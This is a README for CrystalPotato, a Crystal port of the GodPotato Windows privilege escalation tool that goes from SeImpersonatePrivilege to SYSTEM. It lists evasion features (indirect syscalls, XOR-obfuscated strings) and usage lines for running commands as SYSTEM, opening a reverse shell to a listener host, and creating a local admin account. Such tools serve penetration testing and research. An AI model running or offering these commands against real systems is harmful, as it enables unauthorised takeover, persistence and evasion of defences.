# CrystalPotato

Crystal port of GodPotato, a local privilege escalation from accounts with `SeImpersonatePrivilege` to SYSTEM. It works by abusing the DCOM OXID Resolver and named pipe impersonation.

Windows APIs are resolved dynamically and invoked through indirect syscall stubs, all strings are XOR-obfuscated at compile time and by default only the command output is printed.

<p align="center">
  <img src="https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/CrystalPotato/Screenshot_1.png" alt="CrystalPotato" width="420">
</p>


## Build

```
crystal build CrystalPotato.cr -o CrystalPotato.exe --release --static
```


## Usage

Execute a command, start a reverse shell, or create a local admin.

```
CrystalPotato.exe -c <COMMAND>
CrystalPotato.exe -H <LHOST> -P <LPORT> [-c <SHELL>]
CrystalPotato.exe -u <USER> -pw <PASS>
```

| Flag | Description |
|---|---|
| `-c CMD` | Command to execute as SYSTEM, or shell for reverse shell (default: `cmd.exe`) |
| `-H HOST` | Reverse shell listener host |
| `-P PORT` | Reverse shell listener port |
| `-u USER` | Create local admin - Username |
| `-pw PASS` | Create local admin - Password |
| `-p NAME` | Custom pipe name (default: `Crystal`) |
| `-d` | Debug output |
| `-dd` | Full trace |
| `-h` | Show help |

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/CrystalPotato/Screenshot_2.png)


## Sources

- [GodPotato](https://github.com/BeichenDream/GodPotato): Original C# implementation by [BeichenDream](https://github.com/BeichenDream).
- [RustPotato](https://github.com/safedv/RustPotato): Rust implementation by [safedv](https://github.com/safedv).
- [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato): Implementation by [tylerdotrar](https://github.com/tylerdotrar).
